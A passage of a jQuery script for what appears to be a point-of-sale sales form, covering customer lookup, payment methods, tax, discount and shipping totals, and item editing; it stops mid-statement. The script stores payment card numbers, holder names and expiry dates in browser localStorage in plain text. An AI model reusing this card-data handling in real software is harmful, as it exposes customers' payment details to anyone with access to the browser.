$(document).ready(function (e) {
    $('body a, body button').attr('tabindex', -1);
    check_add_item_val();
    if (site.settings.set_focus != 1) {
        $('#add_item').focus();
    }
    var $customer = $('#slcustomer');
    $customer.change(function (e) {
        localStorage.setItem('slcustomer', $(this).val());
        //$('#slcustomer_id').val($(this).val());
    });
    if (slcustomer = localStorage.getItem('slcustomer')) {
        $customer.val(slcustomer).select2({
            minimumInputLength: 1,
            data: [],
            initSelection: function (element, callback) {
                $.ajax({
                    type: "get", async: false,
                    url: site.base_url + "customers/getCustomer/" + $(element).val(),
                    dataType: "json",
                    success: function (data) {
                        $('#companyName').html(data[0].company_name);
                        callback(data[0]);                    }
                });
            },
            ajax: {
                url: site.base_url + "customers/suggestions",
                dataType: 'json',
                quietMillis: 15,
                data: function (term, page) {
                    return {
                        term: term,
                        limit: 10
                    };
                },
                results: function (data, page) {
                    if (data.results != null) {
                        return {results: data.results};
                    } else {
                        return {results: [{id: '', text: 'No Match Found'}]};
                    }
                }
            }
        });
    } else {
        nsCustomer();
    }

// Order level shipping and discount localStorage
    if (sldiscount = localStorage.getItem('sldiscount')) {
        $('#sldiscount').val(sldiscount);
    }
    $('#sltax2').change(function (e) {
        localStorage.setItem('sltax2', $(this).val());
        $('#sltax2').val($(this).val());
    });
    if (sltax2 = localStorage.getItem('sltax2')) {
        $('#sltax2').select2("val", sltax2);
    }
    $('#slsale_status').change(function (e) {
        localStorage.setItem('slsale_status', $(this).val());
    });
    if (slsale_status = localStorage.getItem('slsale_status')) {
        $('#slsale_status').select2("val", slsale_status);
    }
    $('#slpayment_status').change(function (e) {
        var ps = $(this).val();
        localStorage.setItem('slpayment_status', ps);
        if (ps == 'partial' || ps == 'paid') {
                       if (ps == 'paid') {
                var Amt1 = formatDecimal(parseFloat(((total + invoice_tax) - order_discount) + shipping));
				var round_total = roundNumberNEW(Amt1, Number(pos_settings.rounding));
                var rounding = formatDecimal(0 - (Amt1 - round_total));
                $('#amount_1').val(round_total);
				$('#Round_Off').html('(' + rounding + ')');
            }
            $('#payments').slideDown();
            $('#multi-payment').slideDown();
            $('#more_payment_block').slideDown();
            document.getElementById("more_payment_block").style.display = "block";
            $('#pcc_no_1').focus();
        } else {
            $('#payments').slideUp();
            $('#multi-payment').slideUp();
            $('#more_payment_block').slideUp();
            document.getElementById("more_payment_block").style.display = "none";
        }
    });
    if (slpayment_status = localStorage.getItem('slpayment_status')) {
        $('#slpayment_status').select2("val", slpayment_status);
        var ps = slpayment_status;
        if (ps == 'partial' || ps == 'paid') {
            $('#payments').slideDown();
            $('#multi-payment').slideDown();
            $('#more_payment_block').slideDown();
            document.getElementById("more_payment_block").style.display = "block";
            $('#pcc_no_1').focus();
        } else {
            $('#payments').slideUp();
            $('#multi-payment').slideUp();
            $('#more_payment_block').slideUp();
            document.getElementById("more_payment_block").style.display = "none";
        }
    }

    $(document).on('change', '.paid_by', function () {
        $('.final-btn').prop('disabled', false);
		var getid = $(this).attr('id').split("_");
        var p_id = getid[2];
		
        var p_val = $(this).val();
        localStorage.setItem('paid_by', p_val);
        $('#rpaidby').val(p_val);
        $('.g_transaction_id_' + p_id).show();
		$('.gc_' + p_id).hide();
		$('.cd_' + p_id).hide();
        if (p_val == 'cash') {
            $('.g_transaction_id_' + p_id).hide();
            $('.pcheque_' + p_id).hide();
            $('.pcc_' + p_id).hide();
            $('.pcash_' + p_id).show();
            $('#payment_note_1').focus();
        }
        if (p_val == 'other') {
           $('.pcheque_' + p_id).hide();
            $('.pcc_' + p_id).hide();
            $('.pcash_' + p_id).show();
            $('#payment_note_1').focus();
        } else if (p_val == 'CC') {
           $('.pcheque_' + p_id).hide();
            $('.pcash_' + p_id).hide();
            //$('.pcc_1').show();
            $('#pcc_no_' + p_id).focus();
        } else if (p_val == 'Cheque') {
            $('.g_transaction_id_' + p_id).hide();
			$('.gc_' + p_id).hide();
			$('.cd_' + p_id).hide();
            $('.pcc_' + p_id).hide();
            $('.pcash_' + p_id).hide();
            $('.pcheque_' + p_id).show();
            $('#cheque_no_' + p_id).focus();
        } else {
            $('.pcheque_' + p_id).hide();
            $('.pcc_' + p_id).hide();
            $('.pcash_' + p_id).hide();
        }
        if (p_val == 'deposit') {
            $('.g_transaction_id_' + p_id).hide();
        }
        if (p_val == 'gift_card') {
            $('.final-btn').prop('disabled', true);
            $('.g_transaction_id_' + p_id).hide();
            $('.gc_' + p_id).show();
            $('.ngc').hide();
            $('#gift_card_no_' + p_id).focus();
        } else {
            $('.ngc').show();
            $('.gc_' + p_id).hide();
            $('#gc_details_' + p_id).html('');
        }
		 if (p_val == 'credit_note') {
            $('.final-btn').prop('disabled', true);
            $('.g_transaction_id_' + p_id).hide();
            $('.cd_' + p_id).show();
            $('.ngc').hide();
            $('#credit_card_no_' + p_id).focus();
        } else {
            $('.ngc').show();
            $('.cd_' + p_id).hide();
            $('#credit_details_' + p_id).html('');
        }
    });

    if (paid_by = localStorage.getItem('paid_by')) {
        $('.final-btn').prop('disabled', false);
        var p_val = paid_by;
        $('.paid_by').select2("val", paid_by);
        $('#rpaidby').val(p_val);
        $('.g_transaction_id').show();
        if (p_val == 'cash') {
            $('.g_transaction_id').hide();
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').show();
            $('#payment_note_1').focus();
        }
        if (p_val == 'other') {
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').show();
            $('#payment_note_1').focus();
        } else if (p_val == 'CC') {
            $('.pcheque_1').hide();
            $('.pcash_1').hide();
            //$('.pcc_1').show();
            $('#pcc_no_1').focus();
        } else if (p_val == 'Cheque') {
            $('.g_transaction_id').hide();
            $('.pcc_1').hide();
            $('.pcash_1').hide();
            $('.pcheque_1').show();
            $('#cheque_no_1').focus();
        } else {
            $('.pcheque_1').hide();
            $('.pcc_1').hide();
            $('.pcash_1').hide();
        }
        if (p_val == 'deposit') {
            $('.g_transaction_id').hide();
        }
        if (p_val == 'gift_card') {
            $('.final-btn').prop('disabled', true);
            $('.g_transaction_id').hide();
            $('.gc_1').show();
            $('.ngc').hide();
            $('#gift_card_no_1').focus();
        } else {
            $('.ngc').show();
            $('.gc_1').hide();
            $('#gc_details_1').html('');
        }
		if (p_val == 'credit_note') {
            $('.final-btn').prop('disabled', true);
            $('.g_transaction_id').hide();
            $('.cd_1').show();
            $('.ngc').hide();
            $('#credit_card_no_1').focus();
        } else {
            $('.ngc').show();
            $('.cd_1').hide();
            $('#credit_details_1').html('');
        }
    }

    /*if (gift_card_no = localStorage.getItem('gift_card_no')) {
     $('#gift_card_no').val(gift_card_no);
     }*/
     $('.gift_card_no').change(function (e) {
        localStorage.setItem('gift_card_no', $(this).val());
    });
    $('.credit_card_no').change(function (e) {
        localStorage.setItem('credit_card_no', $(this).val());
    });

    if (amount_1 = localStorage.getItem('amount_1')) {
        $('#amount_1').val(amount_1);
    }
    $('#amount_1').change(function (e) {
        localStorage.setItem('amount_1', $(this).val());
    });

    if (paid_by_1 = localStorage.getItem('paid_by_1')) {
        $('#paid_by_1').val(paid_by_1);
    }
    $('#paid_by_1').change(function (e) {
        localStorage.setItem('paid_by_1', $(this).val());
    });

    if (pcc_holder_1 = localStorage.getItem('pcc_holder_1')) {
        $('#pcc_holder_1').val(pcc_holder_1);
    }
    $('#pcc_holder_1').change(function (e) {
        localStorage.setItem('pcc_holder_1', $(this).val());
    });

    if (pcc_type_1 = localStorage.getItem('pcc_type_1')) {
        $('#pcc_type_1').select2("val", pcc_type_1);
    }
    $('#pcc_type_1').change(function (e) {
        localStorage.setItem('pcc_type_1', $(this).val());
    });

    if (pcc_month_1 = localStorage.getItem('pcc_month_1')) {
        $('#pcc_month_1').val(pcc_month_1);
    }
    $('#pcc_month_1').change(function (e) {
        localStorage.setItem('pcc_month_1', $(this).val());
    });

    if (pcc_year_1 = localStorage.getItem('pcc_year_1')) {
        $('#pcc_year_1').val(pcc_year_1);
    }
    $('#pcc_year_1').change(function (e) {
        localStorage.setItem('pcc_year_1', $(this).val());
    });

    if (pcc_no_1 = localStorage.getItem('pcc_no_1')) {
        $('#pcc_no_1').val(pcc_no_1);
    }
    $('#pcc_no_1').change(function (e) {
        var pcc_no = $(this).val();
        localStorage.setItem('pcc_no_1', pcc_no);
        var CardType = null;
        var ccn1 = pcc_no.charAt(0);
        if (ccn1 == 4)
            CardType = 'Visa';
        else if (ccn1 == 5)
            CardType = 'MasterCard';
        else if (ccn1 == 3)
            CardType = 'Amex';
        else if (ccn1 == 6)
            CardType = 'Discover';
        else
            CardType = 'Visa';

        $('#pcc_type_1').select2("val", CardType);
    });

    if (cheque_no_1 = localStorage.getItem('cheque_no_1')) {
        $('#cheque_no_1').val(cheque_no_1);
    }
    $('#cheque_no_1').change(function (e) {
        localStorage.setItem('cheque_no_1', $(this).val());
    });

    if (payment_note_1 = localStorage.getItem('payment_note_1')) {
        $('#payment_note_1').redactor('set', payment_note_1);
    }
    $('#payment_note_1').redactor('destroy');
    $('#payment_note_1').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('payment_note_1', v);
        }
    });

    var old_payment_term;
    $('#slpayment_term').focus(function () {
        old_payment_term = $(this).val();
    }).change(function (e) {
        var new_payment_term = $(this).val() ? parseFloat($(this).val()) : 0;
        if ($(this).val() != '') {
            if (!is_numeric($(this).val())) {
                $(this).val(old_payment_term);
                bootbox.alert(lang.unexpected_value);
                return;
            } else {
                localStorage.setItem('slpayment_term', new_payment_term);
                $('#slpayment_term').val(new_payment_term);
            }
        } else {
            localStorage.setItem('slpayment_term', '');
            $('#slpayment_term').val('');
        }

    });
    if (slpayment_term = localStorage.getItem('slpayment_term')) {
        $('#slpayment_term').val(slpayment_term);
    }

    var old_shipping;
    $('#slshipping').focus(function () {
        old_shipping = $(this).val();
    }).change(function () {
        if (!is_numeric($(this).val())) {
            //$(this).val(0);
           shipping = $(this).val() ? parseFloat($(this).val()) : '0'; 
            bootbox.alert(lang.unexpected_value);
            return;
        } else {
            shipping = $(this).val() ? parseFloat($(this).val()) : '0';
        }
        localStorage.setItem('slshipping', shipping);
        var gtotal = ((total + invoice_tax) - order_discount) + shipping;
        $('#gtotal').text(formatMoney(gtotal));
        $('#tship').text(formatMoney(shipping));
    });
    if (slshipping = localStorage.getItem('slshipping')) {
        shipping = parseFloat(slshipping);
        $('#slshipping').val(shipping);
    } else {
        shipping = 0;
    }
    $('#add_sale,  #print_invoice').attr('disabled', true); //#edit_sale,
    $(document).on('change', '.rserial', function () {
        var item_id = $(this).closest('tr').attr('data-item-id');
        slitems[item_id].row.serial = $(this).val();
        localStorage.setItem('slitems', JSON.stringify(slitems));
    });

// If there is any item in localStorage
    if (localStorage.getItem('slitems')) {
        loadItems();
    }

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('slitems')) {
                    localStorage.removeItem('slitems');
                }
                if (localStorage.getItem('sldiscount')) {
                    localStorage.removeItem('sldiscount');
                }
                if (localStorage.getItem('sltax2')) {
                    localStorage.removeItem('sltax2');
                }
                if (localStorage.getItem('slshipping')) {
                    localStorage.removeItem('slshipping');
                }
                if (localStorage.getItem('slref')) {
                    localStorage.removeItem('slref');
                }
                if (localStorage.getItem('slwarehouse')) {
                    localStorage.removeItem('slwarehouse');
                }
                if (localStorage.getItem('slnote')) {
                    localStorage.removeItem('slnote');
                }
                if (localStorage.getItem('slinnote')) {
                    localStorage.removeItem('slinnote');
                }
                if (localStorage.getItem('slcustomer')) {
                    localStorage.removeItem('slcustomer');
                }
                if (localStorage.getItem('slcurrency')) {
                    localStorage.removeItem('slcurrency');
                }
                if (localStorage.getItem('sldate')) {
                    localStorage.removeItem('sldate');
                }
                if (localStorage.getItem('slstatus')) {
                    localStorage.removeItem('slstatus');
                }
                if (localStorage.getItem('slbiller')) {
                    localStorage.removeItem('slbiller');
                }
                if (localStorage.getItem('gift_card_no')) {
                    localStorage.removeItem('gift_card_no');
                }

                $('#modal-loading').show();
                location.reload();
            }
        });
    });

// save and load the fields in and/or from localStorage

    $('#slref').change(function (e) {
        localStorage.setItem('slref', $(this).val());
    });
    if (slref = localStorage.getItem('slref')) {
        $('#slref').val(slref);
    }

    $('#slwarehouse').change(function (e) {
        localStorage.setItem('slwarehouse', $(this).val());
    });
    if (slwarehouse = localStorage.getItem('slwarehouse')) {
        $('#slwarehouse').select2("val", slwarehouse);
    }

    $('#slnote').redactor('destroy');
    $('#slnote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('slnote', v);
        }
    });
    if (slnote = localStorage.getItem('slnote')) {
        $('#slnote').redactor('set', slnote);
    }
    $('#slinnote').redactor('destroy');
    $('#slinnote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('slinnote', v);
        }
    });
    if (slinnote = localStorage.getItem('slinnote')) {
        $('#slinnote').redactor('set', slinnote);
    }

    // prevent default action usln enter
    $('body').bind('keypress', function (e) {
        if ($(e.target).hasClass('redactor_editor')) {
            return true;
        }
        if (e.keyCode == 13) {
            e.preventDefault();
            return false;
        }
    });

    // Order tax calculation
    if (site.settings.tax2 != 0) {
        $('#sltax2').change(function () {
            localStorage.setItem('sltax2', $(this).val());
            loadItems();
            return;
        });
    }

    // Order discount calculation
    var old_sldiscount;
    $('#sldiscount').focus(function () {
        old_sldiscount = $(this).val();
    }).change(function () {
        var new_discount = $(this).val() ? $(this).val() : '0';
        if (is_valid_discount(new_discount)) {
           /* localStorage.removeItem('sldiscount');
            localStorage.setItem('sldiscount', new_discount);
            loadItems();*/
            updateDoubleDiscount();
            return;
        } else {
            $(this).val(old_sldiscount);
            bootbox.alert(lang.unexpected_value);
            return;
        }

    });

    function updateDoubleDiscount() {
        var sldiscount = $('#sldiscount').val();
        setOrderAsItemsDiscount(sldiscount);
        loadItems();
    }

    function setOrderAsItemsDiscount(new_discount) {
       var ds = new_discount ? new_discount : null;
       if (is_valid_discount(ds)) {
                $('#posdiscount').val(ds);
                localStorage.removeItem('posdiscount');
                localStorage.setItem('posdiscount', ds);
                // $('#sldiscount').val('');
                localStorage.removeItem('sldiscount');
                localStorage.setItem('sldiscount', '');
                //loadItems();
        }

        return;
    }

    /* ----------------------
     * Delete Row Method
     * ---------------------- */
    $(document).on('click', '.sldel', function () {
        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete slitems[item_id];
        row.remove();
        if (slitems.hasOwnProperty(item_id)) {
        } else {
            localStorage.setItem('slitems', JSON.stringify(slitems));
            loadItems();
            return;
        }
    });


    /* -----------------------
     * Edit Row Modal Hanlder
     ----------------------- */
    $(document).on('click', '.edit', function () {
        
        var row = $(this).closest('tr');
        var row_id = row.attr('id');
        item_id = row.attr('data-item-id');
      
        item = slitems[item_id];
         
        if (parseInt(site.settings.product_batch_setting) > 0) {
            var batch_number = row.children().children('.rbtach_no').val();
        }
        
        var qty = row.children().children('.rquantity').val(),
            product_option = row.children().children('.roption').val(),
            unit_price = formatDecimal(row.children().children('.ruprice').val()),
            discount = row.children().children('.rdiscount').val();
        var cf1 = row.children().children('.cf1').val();
        var cf2 = row.children().children('.cf2').val();
        if (item.options !== false) {
            $.each(item.options, function () {
                if (this.id == product_option && this.price != 0 && this.price != '' && this.price != null) {
                    unit_price = parseFloat(item.row.price) + parseFloat(this.price);
                }
            });
        }
        var real_unit_price = item.row.real_unit_price;
        var net_price = unit_price;
        $('#prModalLabel').text(item.row.name + ' (' + item.row.code + ')');
        if (site.settings.tax1) {
            $('#ptax').select2('val', item.row.tax_rate);
            $('#old_tax').val(item.row.tax_rate);
            var item_discount = 0, ds = discount ? discount : '0';
            if (ds.indexOf("%") !== -1) {
                var pds = ds.split("%");
                if (!isNaN(pds[0])) {
                    item_discount = formatDecimal(parseFloat(((unit_price) * parseFloat(pds[0])) / 100), 4);
                } else {
                    item_discount = parseFloat(ds);
                }
            } else {
                item_discount = parseFloat(ds);
            }
            net_price -= item_discount;
            var pr_tax = item.row.tax_rate, pr_tax_val = 0;
            if (pr_tax !== null && pr_tax != 0) {
                $.each(tax_rates, function () {
                    if (this.id == pr_tax) {
                        if (this.type == 1) {
                            if (slitems[item_id].row.tax_method == 0) {
                                pr_tax_val = formatDecimal((((net_price) * parseFloat(this.rate)) / (100 + parseFloat(this.rate))), 4);
                                pr_tax_rate = formatDecimal(this.rate) + '%';
                                net_price -= pr_tax_val;
                            } else {
                                pr_tax_val = formatDecimal((((net_price) * parseFloat(this.rate)) / 100), 4);
                                pr_tax_rate = formatDecimal(this.rate) + '%';
                            }
                        } else if (this.type == 2) {
                            pr_tax_val = parseFloat(this.rate);
                            pr_tax_rate = this.rate;

                        }
                    }
                });
            }
        }
        if (site.settings.product_serial !== 0) {
            $('#pserial').val(row.children().children('.rserial').val());
        }
        var opt = '<p style="margin: 12px 0 0 0;">n/a</p>';
        if (item.options !== false) {
            var o = 1;
            if( (item.row.storage_type == 'loose' && site.settings.sale_loose_products_with_variants == 1) || item.row.storage_type == 'packed' ) {
            
                opt = $("<select id=\"poption\" name=\"poption\" class=\"form-control select\" />");
                $.each(item.options, function () {
                    if (o == 1) {
                        product_variant = item.row.option ? item.row.option : this.id;                       
                    }
                    $("<option />", {value: this.id, text: this.name}).appendTo(opt);
                    o++;
                });
            } else {                
                product_variant = item.row.option;                
                opt = '<p class="form-control" >'+item.options[product_variant].name+'</p>';
            }
        } else {
            product_variant = 0;
        }
        
        
        if (parseInt(site.settings.product_batch_setting) > 0) {
            var edtbatch = '<p style="margin: 12px 0 0 0;"><input class="form-control" name="pbatch_number" type="text" id="pbatch_number"></p>';
            if (parseInt(site.settings.product_batch_setting) == 1) {
                if (item.batchs) {
                    var b = 1;
                    edtbatch = $('<select id="pbatch_number" name="pbatch_number" class="form-control" />');
                    $.each(item.batchs, function () {
                        $('<option data-batchid="' + this.id + '" data-price="' + this.price + '" data-mrp="'+this.mrp+'" data-quantity="'+this.quantity+'" value="' + this.batch_no + '" >' + this.batch_no + '</option>').appendTo(edtbatch);
                        b++;
                    });
                }
            } else if (parseInt(site.settings.product_batch_setting) == 2) {
                if (item.batchs) {
                    edtbatch = '<input list="batches" class="form-control" name="pbatch_number" id="pbatch_number"><datalist id="batches">';
                    $.each(item.batchs, function () {
                        edtbatch += '<option data-batchid="' + this.id + '" data-price="' + this.price + '" data-mrp="'+this.mrp+'" data-quantity="'+this.quantity+'" value="' + this.batch_no + '" >' + this.batch_no + '</option>';
                        batchno = this.batch_no;
                        batchid = this.id;
                        batchIds[batchno] = batchid;
                    });
                    edtbatch += '</datalist>';
                   // slitems[item_id].product_batches = batchIds;
                }
            }
        }

        if (parseInt(site.settings.product_batch_setting) > 0) {
            $('#batchNo_div').html(edtbatch);
            $('#pbatch_number').select2('val', item.row.batch_number);
        }
        
        
        uopt = $("<select id=\"punit\" name=\"punit\" class=\"form-control select\" />");
        $.each(item.units, function () {
            if (this.id == item.row.unit) {
                $("<option />", {value: this.id, text: this.name, selected: true}).appendTo(uopt);
            } else {
                $("<option />", {value: this.id, text: this.name}).appendTo(uopt);
            }
        });

         
        $('#poptions-div').html(opt);
        $('#punits-div').html(uopt);
        $('select.select').select2({minimumResultsForSearch: 7});
        $('#pquantity').val(qty);
        $('#cf1').val(cf1);
        $('#cf2').val(cf2);
        $('#old_qty').val(qty);
        $('#pprice').val(unit_price);
        $('#punit_price').val(formatDecimal(parseFloat(unit_price) + parseFloat(pr_tax_val)));
        $('#poption').select2('val', item.row.option);
        $('#old_price').val(unit_price);
        $('#row_id').val(row_id);
        $('#item_id').val(item_id);
        $('#pserial').val(row.children().children('.rserial').val());
        $('#pdiscount').val(discount);
        $('#net_price').text(formatMoney(net_price));
        $('#pro_tax').text(formatMoney(pr_tax_val));
        $('#storage_type').val(item.row.storage_type);
        $('#prModal').appendTo("body").modal('show');

    });

    $('#prModal').on('shown.bs.modal', function (e) {
        if ($('#poption').select2('val') != '') {
            $('#poption').select2('val', product_variant);
            product_variant = 0;
        }
    });

    $(document).on('change', '#pprice, #ptax, #pdiscount', function () {
        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id');
        var unit_price = parseFloat($('#pprice').val());
        var item = slitems[item_id];
        var ds = $('#pdiscount').val() ? $('#pdiscount').val() : '0';
        if (ds.indexOf("%") !== -1) {
            var pds = ds.split("%");
            if (!isNaN(pds[0])) {
                item_discount = parseFloat(((unit_price) * parseFloat(pds[0])) / 100);
            } else {
                item_discount = parseFloat(ds);
            }
        } else {
            item_discount = parseFloat(ds);
        }
        unit_price -= item_discount;
        var pr_tax = $('#ptax').val(), item_tax_method = item.row.tax_method;
        var pr_tax_val = 0, pr_tax_rate = 0;
        if (pr_tax !== null && pr_tax != 0) {
            $.each(tax_rates, function () {
                if (this.id == pr_tax) {
                    if (this.type == 1) {

                        if (item_tax_method == 0) {
                            pr_tax_val = formatDecimal(((unit_price) * parseFloat(this.rate)) / (100 + parseFloat(this.rate)), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                            unit_price -= pr_tax_val;
                        } else {
                            pr_tax_val = formatDecimal((((unit_price) * parseFloat(this.rate)) / 100), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                        }

                    } else if (this.type == 2) {

                        pr_tax_val = parseFloat(this.rate);
                        pr_tax_rate = this.rate;

                    }
                }
            });
        }

        $('#net_price').text(formatMoney(unit_price));
        $('#pro_tax').text(formatMoney(pr_tax_val));
    });

    $(document).on('change', '#punit', function () {
        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id');
        var item = slitems[item_id];
        if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var opt = $('#poption').val(), nameunit = $('#punit option:selected').text(), unit = $('#punit').val(), base_quantity = $('#pquantity').val(), aprice = 0;
        if (item.options !== false) {
            $.each(item.options, function () {
                if (this.id == opt && this.price != 0 && this.price != '' && this.price != null) {
                    aprice = parseFloat(this.price);
                }
            });
        }
        if (unit != slitems[item_id].row.base_unit) {
            $.each(item.units, function () {
                if (this.id == unit) {
                    base_quantity = unitToBaseQty($('#pquantity').val(), this);
                    $('#pprice').val(formatDecimal(((parseFloat(item.row.base_unit_price + aprice)) * unitToBaseQty(1, this)), 4)).change();
                }
            });
        } else {
            $('#pprice').val(formatDecimal(item.row.base_unit_price + aprice)).change();
        }
        slitems[item_id].row.unit_lable = nameunit;
        localStorage.setItem('slitems', JSON.stringify(slitems));
    });
    
    $(document).on('change', '.rbtach_no', function () {
        /* var item_id = $(this).closest('tr').attr('data-item-id');
         slitems[item_id].row.batch_number = $(this).val();
         localStorage.setItem('slitems', JSON.stringify(slitems));*/

        var item_id     = $(this).closest('tr').attr('data-item-id');
        var batch       = $(this).val();
        var batch_id    = $(this).find(':selected').attr('data-batchid');

        batch_id = batch_id ? batch_id : (slitems[item_id].product_batches[batch] ? slitems[item_id].product_batches[batch] : false);

        slitems[item_id].row.batch_number = batch;

        if (batch_id) {
            slitems[item_id].row.batch = batch_id;

            var batchvalue = slitems[item_id].batchs[batch_id];
            
//            if(batchvalue['cost']) {
//                slitems[item_id].row.cost = batchvalue['cost'];
//                slitems[item_id].row.real_unit_cost = batchvalue['cost'];
//                slitems[item_id].row.base_unit_cost = batchvalue['cost'];
//            }
//            if(batchvalue['price']) {
//                slitems[item_id].row.real_unit_price = batchvalue['price'];            
//                slitems[item_id].row.base_unit_price = batchvalue['price'];
//            }
            
            slitems[item_id].row.batch_quantity = batchvalue['quantity'];
            
            if(batchvalue['mrp'])
            slitems[item_id].row.mrp = batchvalue['mrp'];
        
            slitems[item_id].row.expiry = batchvalue['expiry'] !== '' ? batchvalue['expiry'] : '';
        }

        localStorage.setItem('slitems', JSON.stringify(slitems));
        loadItems();
    });
    
    $(document).on('change', '#pbatch_number', function () {
        if (parseInt(site.settings.product_batch_setting) > 0) {
            onBatchChanged();
        }
    });

    /* ----------------------- *
     * Product option change   *
     * ----------------------- */
    $(document).on('change', '#poption', function () {
        var row = $('#' + $('#row_id').val()), 
        opt = $(this).val();
        var item_id = row.attr('data-item-id');
        var item = slitems[item_id];
        var unit = $('#punit').val(), 
        base_quantity = parseFloat($('#pquantity').val()), 
        base_unit_price = item.row.base_unit_price;
        
        if (unit != slitems[item_id].row.base_unit) {
            $.each(slitems[item_id].units, function () {
                if (this.id == unit) {
                    base_unit_price = formatDecimal((parseFloat(item.row.base_unit_price) * (unitToBaseQty(1, this))), 4)
                    base_quantity = unitToBaseQty($('#pquantity').val(), this);
                }
            });
        }
        
        if (item.options !== false) {
            $.each(item.options, function () {
                if (this.id == opt && this.price != 0 && this.price != '' && this.price != null) {
                    $('#pprice').val(parseFloat(item.row.price) + (parseFloat(this.price))).trigger('change');
                }
            });
        } else {
            $('#pprice').val(parseFloat(base_unit_price)).trigger('change');
        }
        
        if (parseInt(site.settings.product_batch_setting) > 0) {
            onVariantChanged();
        }
    });
    
    /* -----------------------
     * Edit Row Method
     ----------------------- */
    $(document).on('click', '#editItem', function () {
       // var row = $('#' + $('#row_id').val());
       // var item_id = row.attr('data-item-id');
        var item_id     = $('#item_id').val(); 
        var new_pr_tax  = $('#ptax').val(), new_pr_tax_rate = false;
        if (new_pr_tax) {
            $.each(tax_rates, function () {
                if (this.id == new_pr_tax) {
                    new_pr_tax_rate = this;
                }
            });
        }
        var price = parseFloat($('#pprice').val());
        var unit_price = price;
        
        if (item.options !== false) {
            var opt = $('#poption').val();
            $.each(item.options, function () {
                if (this.id == opt && this.price != 0 && this.price != '' && this.price != null) {
                    
                    price = unit_price - parseFloat(this.price);
                                        
                    slitems[item_id].row.option         = opt;
                    slitems[item_id].row.quantity       = this.quantity;
                    slitems[item_id].row.unit_quantity  = this.unit_quantity;                    
                    slitems[item_id].row.unit_weight    = this.unit_weight;                    
                }                
            });            
        }        
        
        if (parseInt(site.settings.product_batch_setting) > 0) {
            var batch       = $('#pbatch_number').val();
            var batch_id    = $('#pbatch_number').find(':selected').attr('data-batchid');
            var bprice      = $('#pbatch_number').find(':selected').attr('data-price');
            var mrp         = $('#pbatch_number').find(':selected').attr('data-mrp');
            var quantity    = $('#pbatch_number').find(':selected').attr('data-quantity');

            slitems[item_id].row.batch_number   = batch;
            slitems[item_id].row.batch          = batch_id;
            slitems[item_id].row.batch_quantity = quantity;
        }        
        
        if (site.settings.product_discount == 1 && $('#pdiscount').val()) {            
            
            var ods = $('#pdiscount').val();
            
            if (ods.indexOf("%") !== -1) {
                var pds = ods.split("%");
                if (isNaN(pds[0])) {
                    bootbox.alert('1'+lang.unexpected_value);
                    return false;
                }
            } else if (!is_numeric(ods)) {
                bootbox.alert('2'+lang.unexpected_value);
                return false;
            } else if(is_numeric($('#pdiscount').val()) && parseFloat($('#pdiscount').val()) > parseFloat(unit_price)) {
                bootbox.alert('3'+lang.unexpected_value);
                return false;
            }
             
        }
       
        var unit = $('#punit').val();
        var base_quantity = parseFloat($('#pquantity').val());
        if (unit != slitems[item_id].row.base_unit) {
            $.each(slitems[item_id].units, function () {
                if (this.id == unit) {
                    base_quantity = unitToBaseQty($('#pquantity').val(), this);
                }
            });
        }
         
        slitems[item_id].row.fup             = 1,
        slitems[item_id].row.qty             = parseFloat($('#pquantity').val()),
        slitems[item_id].row.base_quantity   = base_quantity,
        slitems[item_id].row.unit_price      = unit_price; 
        slitems[item_id].row.price           = price;
        slitems[item_id].row.real_unit_price = unit_price,        
        slitems[item_id].row.base_unit_price = unit_price,        
        slitems[item_id].row.unit            = unit,
        slitems[item_id].row.tax_rate        = new_pr_tax,
        slitems[item_id].tax_rate            = new_pr_tax_rate,
        slitems[item_id].row.discount        = $('#pdiscount').val() ? $('#pdiscount').val() : '',         
        slitems[item_id].row.serial          = $('#pserial').val();
        slitems[item_id].row.cf1             = $('#cf1').val();
        slitems[item_id].row.cf2             = $('#cf2').val();
        /*localStorage.setItem('slitems', JSON.stringify(slitems));
        $('#prModal').modal('hide');
        loadItems();
        return;*/

        var Item = slitems[item_id];
        delete slitems[item_id];
        resetCartItems();
        localStorage.setItem('slitems', JSON.stringify(slitems));
        $('#prModal').modal('hide');
        add_invoice_item(Item);
        loadItems();
        return;
    });
   
    /* ------------------------------
     * Sell Gift Card modal
     ------------------------------- */
    $(document).on('click', '#sellGiftCard', function (e) {
        if (count == 1) {
            slitems = {};
            if ($('#slwarehouse').val() && $('#slcustomer').val()) {
                $('#slcustomer').select2("readonly", true);
                $('#slwarehouse').select2("readonly", true);
            } else {
                bootbox.alert(lang.select_above);
                item = null;
                return false;
            }
        }
        $('#gcModal').appendTo("body").modal('show');
        return false;
    });

    $(document).on('click', '#addGiftCard', function (e) {
        var mid = (new Date).getTime(),
                gccode = $('#gccard_no').val(),
                gcname = $('#gcname').val(),
                gcvalue = $('#gcvalue').val(),
                gccustomer = $('#gccustomer').val(),
